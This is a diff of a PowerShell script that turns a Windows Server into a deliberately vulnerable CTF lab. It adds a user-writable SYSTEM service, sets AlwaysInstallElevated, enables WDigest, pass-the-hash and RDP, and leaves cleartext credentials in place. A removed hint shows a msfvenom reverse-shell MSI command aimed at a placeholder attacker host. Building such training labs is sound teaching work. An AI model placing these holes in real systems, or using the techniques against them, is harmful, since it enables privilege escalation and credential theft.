+    # TWO-PART (exploit-weighted):
+    #  Part 2 (exploit, Hard): SYSTEM-only flag -- only a malicious MSI running as SYSTEM reads it.
+    $msiFlag = New-CTFFlag -Location "AlwaysInstallElevated (exploit)" -Description "MSI executed as SYSTEM" -Points 40 -Difficulty "Hard" -Technique "AlwaysInstallElevated MSI -> SYSTEM"
     $flagPath = "C:\Windows\System32\config\systemprofile\msi_flag.txt"
     $flagDir = Split-Path $flagPath -Parent
-    
-    # Create directory if it doesn't exist
-    if (!(Test-Path $flagDir)) {
-        New-Item -Path $flagDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    }
-    
-    $msiFlag | Out-File $flagPath -Force
-    
-    # Create a sample MSI in Public folder for students to find
-    $msiInfo = @"
-AlwaysInstallElevated is enabled!
-Generate malicious MSI with: msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi > shell.msi
-Or use: msiexec /quiet /qn /i malicious.msi
-Flag location hint: Check SYSTEM profile directory after escalation
-"@
-    $msiInfo | Out-File "C:\Public\msi_hint.txt"
+    if (!(Test-Path $flagDir)) { New-Item -Path $flagDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
+    (Enc-Flag $msiFlag) | Out-File $flagPath -Force
+    icacls $flagPath /inheritance:r /grant "*S-1-5-18:(F)" "*S-1-5-32-544:(F)" | Out-Null
+
+    #  Part 1 (identify, Medium): AIE enabled is discoverable in the registry; readable hint carries the token.
+    $aieFind = New-CTFFlag -Location "AlwaysInstallElevated (identify)" -Description "Spotted AIE enabled (HKLM+HKCU)" -Points 15 -Difficulty "Medium" -Technique "Registry enumeration / PowerUp"
+    @"
+AlwaysInstallElevated is enabled (HKLM + HKCU). Any .msi installs as SYSTEM.
+Generate a malicious MSI (msfvenom -f msi ...) and run it: msiexec /quiet /qn /i malicious.msi
+identify token (base64): $(Enc-Flag $aieFind)
+"@ | Out-File "C:\Public\msi_hint.txt" -Force
     
     Write-Host "  AlwaysInstallElevated configured with flag" -ForegroundColor Green
 }
 
-# Function to configure Print Spooler vulnerabilities
-function Configure-PrintSpoolerVulnerabilities {
-    Write-Host "Configuring Print Spooler vulnerabilities with flags..." -ForegroundColor Yellow
-    
-    # Ensure Print Spooler is running
-    Set-Service -Name "Spooler" -StartupType Automatic
-    Start-Service -Name "Spooler" -ErrorAction SilentlyContinue
-    
-    # Enable Point and Print without warnings (CVE-2021-34527 related)
-    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Force | Out-Null
-    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "NoWarningNoElevationOnInstall" -Value 1 -PropertyType DWORD -Force
-    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "UpdatePromptSettings" -Value 2 -PropertyType DWORD -Force
-    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "RestrictDriverInstallationToAdministrators" -Value 0 -PropertyType DWORD -Force
-    
-    # Create writable spool directory.
-    # Field failure: "color has no permissions assigned to Everyone". The
-    # color\ directory is owned by NT SERVICE\TrustedInstaller, and the original
-    # `icacls ... /T` could fail to apply (locked child color profiles abort the
-    # recursive pass, and Administrators may lack WRITE_DAC by inheritance). We
-    # therefore (1) take ownership to Administrators, (2) guarantee Administrators
-    # WRITE_DAC, then (3) grant Everyone via the well-known SID *S-1-1-0 (locale
-    # independent) WITHOUT /T so a single locked child can't abort the grant, and
-    # (4) verify the ACE actually landed.
-    $spoolPath = "C:\Windows\System32\spool\drivers\color"
-    New-Item -Path $spoolPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+# Function to configure a modifiable-service (weak service DACL) privilege escalation.
+# REPLACES the old PrintNightmare/Point-and-Print setup: on patched Server 2019 builds the
+# CVE-2021-34527 path (RpcAddPrinterDriverEx / point-and-print) is dead, so this swaps in a
+# reliable, extremely common real-world server privesc instead.
+#
+# The vulnerability: a service that runs as LocalSystem is given a WEAK OBJECT DACL granting
+# BUILTIN\Users (S-1-5-32-545) SERVICE_CHANGE_CONFIG (DC) plus SERVICE_START (RP) / SERVICE_STOP (WP).
+# A non-admin can therefore rewrite the service's binPath to an arbitrary command and (re)start it;
+# the SCM launches that command as LocalSystem -> SYSTEM. This is what accesschk / PowerUp
+# Get-ModifiableService flag on real engagements.
+#
+# Note this is a DIFFERENT primitive from WeakPermService (Create-VulnerableServices): that service
+# grants low-priv principals only read/query rights (no DC) -> it is enumeration-only. Here Users
+# hold DC, so the service is actually reconfigurable = exploitable to SYSTEM.
+function Configure-ModifiableService {
+    Write-Host "Configuring modifiable-service (weak service DACL) vulnerability with flags..." -ForegroundColor Yellow
 
-    takeown /F "$spoolPath" /A 2>$null | Out-Null
-    icacls "$spoolPath" /grant "*S-1-5-32-544:(OI)(CI)F" | Out-Null   # Administrators full (ensures WRITE_DAC)
-    icacls "$spoolPath" /grant "*S-1-1-0:(OI)(CI)F"       | Out-Null   # Everyone full (the vulnerability)
+    $svcName    = "SiteHealthSvc"
+    $svcDisplay = "Endpoint Health Monitor"
 
-    if ((icacls "$spoolPath" 2>$null) -match "S-1-1-0|Everyone") {
-        Write-Host "  Everyone:(OI)(CI)F applied to spool\drivers\color" -ForegroundColor Green
+    # Create the service (runs as LocalSystem by default). Demand-start with a benign placeholder
+    # binPath so it doesn't spam boot-time SCM errors; the student supplies the real payload.
+    sc.exe create $svcName binPath= "C:\Windows\System32\cmd.exe /c exit" start= demand DisplayName= "$svcDisplay" | Out-Null
+    sc.exe description $svcName "Endpoint health/telemetry agent (vendor: OverClock Systems)." | Out-Null
+
+    # THE VULNERABILITY: weak object DACL. BUILTIN\Users (BU = S-1-5-32-545) get
+    # CCDCLCSWRPWPDTLOCRRC = query config / CHANGE CONFIG (DC) / query status / enum / START (RP) /
+    # STOP (WP) / pause / interrogate / user-control / read. DC lets a non-admin rewrite binPath;
+    # RP/WP let them restart it -> the new binPath runs as SYSTEM. (SYSTEM + Administrators keep full.)
+    sc.exe sdset $svcName "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRRC;;;BU)" | Out-Null
+
+    if ((sc.exe sdshow $svcName 2>$null) -match "CCDCLCSWRPWPDTLOCRRC;;;BU") {
+        Write-Host "  Weak DACL applied to $svcName (BUILTIN\Users: SERVICE_CHANGE_CONFIG)" -ForegroundColor Green
     } else {
-        Write-Host "  WARNING: Everyone ACE did NOT apply to $spoolPath - re-run elevated" -ForegroundColor Red
+        Write-Host "  WARNING: weak DACL did NOT apply to $svcName - re-run elevated" -ForegroundColor Red
     }
 
-    # PrintNightmare flag (placed AFTER the grant so it inherits Everyone:F and is
-    # readable by a low-priv student).
-    $spoolerFlag = New-CTFFlag -Location "Print Spooler Exploit" -Description "PrintNightmare exploitation successful" -Points 45 -Difficulty "Hard" -Technique "PrintNightmare/Print Spooler abuse"
-    $spoolerFlag | Out-File "$spoolPath\printnightmare_flag.txt" -Force
-    
-    # Create vulnerable printer
-    Add-PrinterDriver -Name "Generic / Text Only" -ErrorAction SilentlyContinue
-    Add-PrinterPort -Name "FILE:" -ErrorAction SilentlyContinue
-    Add-Printer -Name "VulnerablePrinter" -DriverName "Generic / Text Only" -PortName "FILE:" -Shared -ShareName "VulnPrinter" -PermissionSDDL "O:BAG:DUD:(A;;LCSWSDRCWDWO;;;WD)" -ErrorAction SilentlyContinue
-    
-    Write-Host "  Print Spooler vulnerabilities configured with flags" -ForegroundColor Green
+    # Part 1 (identify, Medium): the weak DACL is discoverable (accesschk -uwcqv <user> *,
+    # PowerUp Get-ModifiableService, or `sc sdshow`). Token stored in an OCLab note + a readable breadcrumb.
+    $msFind = New-CTFFlag -Location "Modifiable Service (identify)" -Description "Spotted service with user-writable DACL (SERVICE_CHANGE_CONFIG)" -Points 15 -Difficulty "Medium" -Technique "Weak service DACL enumeration"
+    if (-not (Test-Path "HKLM:\SOFTWARE\OCLab")) { New-Item -Path "HKLM:\SOFTWARE\OCLab" -Force -ErrorAction SilentlyContinue | Out-Null }  # guard: -Force on an existing key WIPES its values (clobbers the other identify notes)
+    New-ItemProperty -Path "HKLM:\SOFTWARE\OCLab" -Name "ModSvcNote" -Value (Enc-Flag $msFind) -Force -ErrorAction SilentlyContinue | Out-Null
+    "Service '$svcName' ($svcDisplay) has a weak DACL: BUILTIN\Users hold SERVICE_CHANGE_CONFIG + START/STOP.`nA non-admin can rewrite its binPath and restart it to run code as LocalSystem.`nidentify token (base64): $(Enc-Flag $msFind)" | Out-File "C:\Public\service_permissions.txt" -Force
+
+    # Part 2 (exploit, Hard): SYSTEM-gated. The student MUST reconfigure the service binPath + restart it
+    # (which runs as SYSTEM) to read this. No world-readable shortcut - that keeps the "Hard" rating honest.
+    $msFlag = New-CTFFlag -Location "Modifiable Service (exploit)" -Description "binPath reconfigured -> command ran as SYSTEM" -Points 45 -Difficulty "Hard" -Technique "Modifiable service DACL -> SYSTEM"
+    $msFlagDir = "C:\ProgramData\OCLab"
+    if (!(Test-Path $msFlagDir)) { New-Item -Path $msFlagDir -ItemType Directory -Force | Out-Null }
+    $msFlagPath = "$msFlagDir\modsvc_flag.txt"
+    (Enc-Flag $msFlag) | Out-File $msFlagPath -Force
+    # GATE: strip inheritance; grant only SYSTEM + Administrators (must escalate to read).
+    icacls $msFlagPath /inheritance:r /grant "*S-1-5-18:(F)" "*S-1-5-32-544:(F)" | Out-Null
+
+    Write-Host "  Modifiable-service DACL vulnerability configured with flags" -ForegroundColor Green
 }
 
 # Function to install and configure vulnerable SSH
@@ -659,9 +818,13 @@ function Configure-VulnerableSSH {
         }
     }
 
-    # Start SSH service
-    Start-Service sshd -ErrorAction SilentlyContinue
+    # Start SSH service. The sshd service can take a moment to register after
+    # Add-WindowsCapability; wait for it to exist first, otherwise Set-Service
+    # silently no-ops and sshd stays at Manual startup -> SSH (Flags 18/19) does
+    # NOT come back after the post-build reboot.
+    for ($i = 0; $i -lt 30 -and -not (Get-Service sshd -ErrorAction SilentlyContinue); $i++) { Start-Sleep -Seconds 2 }
     Set-Service -Name sshd -StartupType 'Automatic'
+    Start-Service sshd -ErrorAction SilentlyContinue
 
     # SSH banner flag
     $sshFlag = New-CTFFlag -Location "SSH Banner" -Description "SSH server banner" -Points 10 -Difficulty "Easy" -Technique "Service enumeration"
@@ -733,7 +896,7 @@ function Create-VulnerableServices {
     # Service with weak permissions
     $svcDescFlag = New-CTFFlag -Location "Service Description" -Description "WeakPermService description" -Points 15 -Difficulty "Easy" -Technique "Service enumeration"
     sc.exe create WeakPermService binpath= "C:\Windows\System32\cmd.exe /c echo vulnerable" start= auto
-    sc.exe description WeakPermService "Weak Permission Service - $svcDescFlag"
+    sc.exe description WeakPermService "Weak Permission Service - token:$(Enc-Flag $svcDescFlag)"
     sc.exe sdset WeakPermService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;RPWP;;;WD)"
     
     Write-Host "  Additional vulnerable services created" -ForegroundColor Green
@@ -747,7 +910,7 @@ function Create-VulnerableScheduledTasks {
     $taskFlag = New-CTFFlag -Location "Scheduled Task" -Description "VulnTask output" -Points 25 -Difficulty "Medium" -Technique "Scheduled task abuse"
     
     # Create task with stored credentials that writes flag
-    $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\cmd.exe" -Argument "/c echo $taskFlag > C:\Public\taskflag.txt"
+    $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\cmd.exe" -Argument "/c echo $(Enc-Flag $taskFlag) > C:\Public\taskflag.txt"
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
     $principal = New-ScheduledTaskPrincipal -UserId "overclock" -LogonType Password -RunLevel Highest
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
@@ -764,15 +927,26 @@ function Create-RegistryFlags {
     # Easy flag in HKLM
     $regFlag1 = New-CTFFlag -Location "Registry HKLM" -Description "HKLM:\SOFTWARE\VulnApp" -Points 15 -Difficulty "Easy" -Technique "Registry enumeration"
     New-Item -Path "HKLM:\SOFTWARE\VulnApp" -Force | Out-Null
-    New-ItemProperty -Path "HKLM:\SOFTWARE\VulnApp" -Name "LicenseKey" -Value $regFlag1 -Force
+    New-ItemProperty -Path "HKLM:\SOFTWARE\VulnApp" -Name "LicenseKey" -Value (Enc-Flag $regFlag1) -Force
     
     # Medium flag in HKCU
     $regFlag2 = New-CTFFlag -Location "Registry HKCU" -Description "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Points 25 -Difficulty "Medium" -Technique "Persistence mechanism review"
-    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdaterFlag" -Value "cmd /c echo $regFlag2" -Force
+    # As SYSTEM, an HKCU: write lands in SYSTEM's hive (HKU\S-1-5-18), which the student never sees. Seed
+    # it into the DEFAULT profile template so overclock's first-login profile inherits it in its own HKCU
+    # Run key (the profile doesn't exist yet at build time, so we can't write overclock's hive directly).
+    $regRunVal = "cmd /c echo $(Enc-Flag $regFlag2)"
+    $defDat3 = "C:\Users\Default\NTUSER.DAT"
+    if (Test-Path $defDat3) {
+        reg load "HKU\OCDEF3" $defDat3 2>$null | Out-Null
+        $ocRun = "Registry::HKEY_USERS\OCDEF3\Software\Microsoft\Windows\CurrentVersion\Run"
+        New-Item -Path $ocRun -Force -ErrorAction SilentlyContinue | Out-Null
+        New-ItemProperty -Path $ocRun -Name "UpdaterFlag" -Value $regRunVal -Force -ErrorAction SilentlyContinue | Out-Null
+        [gc]::Collect(); Start-Sleep -Milliseconds 300; reg unload "HKU\OCDEF3" 2>$null | Out-Null
+    }
     
     # Hard flag in service registry
     $regFlag3 = New-CTFFlag -Location "Registry Service" -Description "Service ImagePath" -Points 35 -Difficulty "Hard" -Technique "Service registry analysis"
-    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnScanner" -Name "Flag" -Value $regFlag3 -Force
+    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnScanner" -Name "Flag" -Value (Enc-Flag $regFlag3) -Force
     
     Write-Host "  Registry flags created" -ForegroundColor Green
 }
@@ -797,7 +971,7 @@ function Create-VulnerableWebApps {
 <h1>Admin Panel</h1>
 <!-- TODO: Remove debug info before production -->
 <!-- Admin password: $LabPassword -->
-<!-- $webFlag1 -->
+<!-- app-config-token: $(Enc-Flag $webFlag1) -->
 <form method="GET">
     Username: <input type="text" name="user"><br>
     Password: <input type="password" name="pass"><br>
@@ -806,7 +980,7 @@ function Create-VulnerableWebApps {
 </body>
 </html>
 "@
-    $vulnPage | Out-File "C:\inetpub\wwwroot\vulnapp\login.html"
+    $vulnPage | Out-File "C:\inetpub\wwwroot\vulnapp\login.html" -Encoding ASCII
 
     # FLAG 25 discoverability fix. The original relied on gobuster finding
     # /vulnapp, but "vulnapp" is NOT in dirb's common.txt, so the directory was
@@ -870,10 +1044,15 @@ function Enable-LegacyProtocols {
 
 # Function to generate flag documentation
 function Generate-FlagReport {
-    Write-Host "`nGenerating flag report..." -ForegroundColor Cyan
-    
+    # DISABLED BY DESIGN (v5 realism pass): the on-box answer key is a security
+    # no-no for a student-distributed script. Produce it off-box, admin-only, with
+    # Generate-AnswerKey.py. This function is a neutered stub kept for compatibility.
+    Write-Host "  [answer key] On-box report disabled; use Generate-AnswerKey.py (admin, off-box)." -ForegroundColor DarkYellow
+    return $null
+
+    # --- unreachable legacy body (kept for reference; never executes) ---
     $reportPath = "C:\CTF_FLAGS_SERVER_v5_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
-    
+
     $html = @"
 <!DOCTYPE html>
 <html>
@@ -965,21 +1144,45 @@ function Generate-FlagReport {
     return $reportPath
 }
 
+# Enable RDP + grant the low-priv student account interactive logon.
+# WHY: SeDebugPrivilege (FLAG 4) and AlwaysInstallElevated (FLAG 16) are PRIVILEGE-abuse
+# techniques that only work from an INTERACTIVE logon token. A pure WinRM/evil-winrm
+# (network) logon STRIPS SeDebug from the token and msiexec can't elevate non-interactively.
+# Real servers almost always have RDP enabled, so we enable it here and put `overclock`
+# in Remote Desktop Users: the student RDPs in with looted creds, gets a full interactive
+# token, and can then perform the privilege-abuse escalations for real.
+function Enable-RDPAccess {
+    Write-Host "Enabling RDP + interactive logon for the student account..." -ForegroundColor Yellow
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0 -ErrorAction SilentlyContinue
+    # Require NLA (secure/realistic default; FreeRDP/mstsc both support it).
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication -Value 1 -ErrorAction SilentlyContinue
+    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
+    Set-Service -Name TermService -StartupType Automatic -ErrorAction SilentlyContinue
+    Start-Service -Name TermService -ErrorAction SilentlyContinue
+    net localgroup "Remote Desktop Users" overclock /add 2>$null
+    Write-Host "  RDP enabled; overclock added to Remote Desktop Users" -ForegroundColor Green
+}
+
 # Main execution
 Write-Host "`nStarting vulnerable server configuration v5 ..." -ForegroundColor Cyan
 Write-Host "========================================" -ForegroundColor Cyan
 
 # Run all configurations
 Create-WeakUsers
+Enable-RDPAccess
 Disable-SecurityFeatures
 Configure-MimikatzVulnerabilities
-Configure-DebugPrivileges
+# SeDebugPrivilege privesc is NOT used on the server: it requires the low-priv user's token to carry
+# SeDebug, but this box runs UAC ON (needed for the AlwaysInstallElevated flag), and UAC strips SeDebug
+# from every non-elevated token -- so a standard user can never hold it here. SeDebug lives on the
+# WORKSTATION box (UAC off) instead (complementary split -- both techniques practiced, each where it works).
+# Configure-DebugPrivileges   # intentionally disabled (UAC-on incompatible with non-admin SeDebug)
 Configure-PassTheHash
 Configure-VulnerableRDP
 Configure-VulnerableSMB
 Create-UnquotedServicePaths
 Configure-AlwaysInstallElevated
-Configure-PrintSpoolerVulnerabilities
+Configure-ModifiableService
 Configure-VulnerableSSH
 Create-VulnerableServices
 Create-VulnerableScheduledTasks
@@ -990,10 +1193,13 @@ Enable-LegacyProtocols
 # Additional misconfigurations
 Write-Host "`nApplying additional misconfigurations..." -ForegroundColor Yellow
 
-# AutoLogon
+# AutoLogon creds left in the registry as a realistic cleartext-credential loot artifact (a classic
+# Winlogon disclosure), BUT AutoAdminLogon is OFF: if overclock were auto-logged into the console,
+# an RDP connection as overclock reconnects to that console session instead of starting a fresh one,
+# which breaks the interactive RDP privesc path (SeDebug/AIE). Students RDP in with looted creds.
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Value "overclock"
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -Value "Administrator2025!"
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -Value 1
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -Value 0
 
 # Store credentials
 cmdkey /add:DC01 /user:Administrator /pass:$LabPassword
@@ -1004,26 +1210,104 @@ Enable-PSRemoting -Force -SkipNetworkProfileCheck
 Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true -ErrorAction SilentlyContinue
 Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true -ErrorAction SilentlyContinue
 
-# Generate reports if requested
+# --- LSASS service finalizer (runs LAST, after every secedit /areas USER_RIGHTS block) ---
+# Guarantees OCLabBackup is RUNNING as svc_backup so its cleartext WDigest cred is resident in LSASS.
+# Two things bit us during builds: (1) a later USER_RIGHTS secedit template races svc_backup's
+# SeServiceLogonRight away -> we re-grant it here via the LSA API (additive/immediate, no template
+# replace); (2) the account/service passwords could disagree -> we re-sync both to the same token, then
+# start with retries. Idempotent and last, so nothing clobbers it.
+if ((Get-Service OCLabBackup -ErrorAction SilentlyContinue) -and $global:OCSvcPwd) {
+    Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+public static class LsaRights {
+  [StructLayout(LayoutKind.Sequential)] struct LSA_UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }
+  [StructLayout(LayoutKind.Sequential)] struct LSA_OBJECT_ATTRIBUTES { public int Length; public IntPtr RootDirectory; public IntPtr ObjectName; public uint Attributes; public IntPtr SecurityDescriptor; public IntPtr SecurityQualityOfService; }
+  [DllImport("advapi32.dll", SetLastError=true)] static extern uint LsaOpenPolicy(IntPtr S, ref LSA_OBJECT_ATTRIBUTES O, uint A, out IntPtr H);
+  [DllImport("advapi32.dll", SetLastError=true)] static extern uint LsaAddAccountRights(IntPtr H, byte[] Sid, LSA_UNICODE_STRING[] R, uint C);
+  [DllImport("advapi32.dll")] static extern uint LsaClose(IntPtr H);
+  [DllImport("advapi32.dll")] static extern int LsaNtStatusToWinError(uint s);
+  public static int Grant(byte[] sid, string right) {
+    LSA_OBJECT_ATTRIBUTES oa = new LSA_OBJECT_ATTRIBUTES(); IntPtr ph;
+    uint st = LsaOpenPolicy(IntPtr.Zero, ref oa, 0x00000810, out ph);
+    if (st != 0) return LsaNtStatusToWinError(st);
+    LSA_UNICODE_STRING[] r = new LSA_UNICODE_STRING[1];
+    r[0].Buffer = Marshal.StringToHGlobalUni(right);
+    r[0].Length = (ushort)(right.Length*2); r[0].MaximumLength = (ushort)((right.Length+1)*2);
+    st = LsaAddAccountRights(ph, sid, r, 1); LsaClose(ph);
+    return LsaNtStatusToWinError(st);
+  }
+}
+'@ -ErrorAction SilentlyContinue
+    try {
+        $sidO = New-Object System.Security.Principal.SecurityIdentifier((Get-LocalUser $global:OCSvcAcct).SID.Value)
+        $sidB = New-Object byte[] $sidO.BinaryLength; $sidO.GetBinaryForm($sidB, 0)
+        [LsaRights]::Grant($sidB, "SeServiceLogonRight") | Out-Null
+    } catch {}
+    Set-LocalUser $global:OCSvcAcct -Password (ConvertTo-SecureString $global:OCSvcPwd -AsPlainText -Force) -ErrorAction SilentlyContinue
+    Enable-LocalUser $global:OCSvcAcct -ErrorAction SilentlyContinue
+    & sc.exe config OCLabBackup obj= (".\" + $global:OCSvcAcct) password= "$global:OCSvcPwd" | Out-Null
+    for ($si = 0; $si -lt 6; $si++) {
+        if ((Get-Service OCLabBackup).Status -eq 'Running') { break }
+        sc.exe start OCLabBackup | Out-Null
+        Start-Sleep 3
+    }
+}
+
+# NOTE: on-box answer-key report REMOVED by design (students must not dump flags).
+# -GenerateFlagReport is accepted for compatibility but only prints this notice.
+# Generate the instructor key off-box, admin-only: python3 Generate-AnswerKey.py
 if ($GenerateFlagReport) {
-    $reportPath = Generate-FlagReport
+    # Emit a VALUES-FREE manifest (seed + REAL loop-expanded flag locations/metadata, NO FLAG{} values).
+    # Off-box Generate-AnswerKey.py derives values from the seed + these real keys. Admin-only.
+    $manifest = [PSCustomObject]@{
+        seed  = $global:OC_FLAG_SEED
+        box   = "server"
+        flags = @($global:FlagList | Select-Object FlagID, Location, Difficulty, Technique)
+    }
+    $manifest | ConvertTo-Json -Depth 5 | Out-File "C:\oc-flag-manifest.json" -Encoding UTF8
+    Write-Host "  [answer key] Values-free manifest -> C:\oc-flag-manifest.json (no values; pull it, run Generate-AnswerKey.py off-box)." -ForegroundColor DarkYellow
 }
 
 Write-Host "`n========================================" -ForegroundColor Green
+# Belt-and-suspenders: Add-WindowsCapability can register the sshd service LATE
+# (the SSH-section Set-Service can run before the service exists), so re-assert
+# Automatic startup at the very END when it definitely exists -- otherwise SSH
+# (Flags 18/19) is Manual/Stopped after the required reboot.
+# Add-WindowsCapability registers the sshd service TOO LATE for any in-build fix
+# to catch it (it isn't registered even by end-of-script -- the build log shows
+# "Service sshd was not found"). So DEFER the fix to boot time: an AtStartup task
+# (SYSTEM) forces sshd Automatic + started once the service actually exists.
+$sshFix = 'Set-Service sshd -StartupType Automatic -ErrorAction SilentlyContinue; Start-Service sshd -ErrorAction SilentlyContinue'
+$sshAct = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NonInteractive -WindowStyle Hidden -Command $sshFix"
+$sshTrg = New-ScheduledTaskTrigger -AtStartup
+$sshPrn = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest
+Register-ScheduledTask -TaskName 'EnsureSSHD' -Action $sshAct -Trigger $sshTrg -Principal $sshPrn -Force -ErrorAction SilentlyContinue | Out-Null
+# best-effort immediate attempt too, in case sshd registered by now
+Start-Sleep -Seconds 5
+if (Get-Service sshd -ErrorAction SilentlyContinue) { Set-Service sshd -StartupType Automatic -ErrorAction SilentlyContinue; Start-Service sshd -ErrorAction SilentlyContinue }
+
+# --- DECOY canaries: punish a blind `Select-String FLAG{` sweep. The answer key
+# / submission system MUST reject every FLAG{DECOY_*}.
+if (-not (Test-Path "HKLM:\SOFTWARE\OCLab")) { New-Item -Path "HKLM:\SOFTWARE\OCLab" -Force -ErrorAction SilentlyContinue | Out-Null }  # guard: -Force on an existing key WIPES its values (clobbered the identify notes)
+New-ItemProperty -Path "HKLM:\SOFTWARE\OCLab" -Name "AuditFlag" -Value "FLAG{DECOY_TRY_HARDER_A1}" -Force -ErrorAction SilentlyContinue | Out-Null
+"Ops reminder: rotate creds monthly. FLAG{DECOY_NOT_HERE_B2}" | Out-File "C:\Public\ops_notes.txt" -Force
+[Environment]::SetEnvironmentVariable("OC_AUDIT_TOKEN","FLAG{DECOY_KEEP_LOOKING_C3}","Machine")
+
 Write-Host "Server vulnerability configuration v5 complete!" -ForegroundColor Green
 Write-Host "========================================" -ForegroundColor Green
 Write-Host ""
 Write-Host "MIMIKATZ-FRIENDLY FEATURES:" -ForegroundColor Cyan
 Write-Host "  WDigest enabled (plaintext passwords in memory)" -ForegroundColor Yellow
 Write-Host "  LSA Protection disabled" -ForegroundColor Yellow
-Write-Host "  Debug privileges granted to users" -ForegroundColor Yellow
+Write-Host "  (SeDebug privesc intentionally OFF here -- lives on the workstation; UAC on for AIE)" -ForegroundColor DarkGray
 Write-Host "  Pass-the-Hash enabled (NTLM)" -ForegroundColor Yellow
 Write-Host "  Credential Guard disabled" -ForegroundColor Yellow
 Write-Host ""
 Write-Host "OTHER VULNERABILITIES:" -ForegroundColor Cyan
 Write-Host "  Unquoted Service Paths (3 services)" -ForegroundColor Yellow
 Write-Host "  AlwaysInstallElevated MSI" -ForegroundColor Yellow
-Write-Host "  Print Spooler (PrintNightmare)" -ForegroundColor Yellow
+Write-Host "  Modifiable Service DACL (SiteHealthSvc -> SYSTEM)" -ForegroundColor Yellow
 Write-Host ""
 Write-Host "FLAG STATISTICS:" -ForegroundColor Cyan
 Write-Host "  Total Flags Placed: $($global:FlagList.Count)" -ForegroundColor Yellow
@@ -1042,3 +1326,23 @@ Write-Host "REMINDER: This server is now EXTREMELY VULNERABLE!" -ForegroundColor
 Write-Host "Optimized for Mimikatz credential extraction!" -ForegroundColor Red
 Write-Host ""
 Write-Host "Please restart the server to ensure all changes take effect." -ForegroundColor Cyan
+
+# ================= OPTIONAL: join OVERCLOCK.LOCAL (VM1 / Domain Controller) =================
+# Additive integration. All lab accounts above are LOCAL (New-LocalUser / net user), so a
+# domain join changes nothing about the existing flags -- it only adds the AD attack surface
+# hosted on the DC (VM1). Run with -JoinDomain (point -DCIP at the live DC).
+if ($JoinDomain) {
+    Write-Host ""
+    Write-Host "[JoinDomain] Pointing DNS at $DCIP and joining $DomainName ..." -ForegroundColor Green
+    $ifn = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1).Name
+    Set-DnsClientServerAddress -InterfaceAlias $ifn -ServerAddresses $DCIP -EA SilentlyContinue
+    $djSec  = ConvertTo-SecureString $DomainJoinPass -AsPlainText -Force
+    $djCred = New-Object System.Management.Automation.PSCredential($DomainJoinUser, $djSec)
+    try {
+        Add-Computer -DomainName $DomainName -Credential $djCred -Force -EA Stop
+        Write-Host "[JoinDomain] Joined $DomainName. Reboot required to apply." -ForegroundColor Green
+        if ($Unattended) { Restart-Computer -Force }
+    } catch {
+        Write-Host "[JoinDomain] FAILED: $($_.Exception.Message)" -ForegroundColor Red
+    }
+}
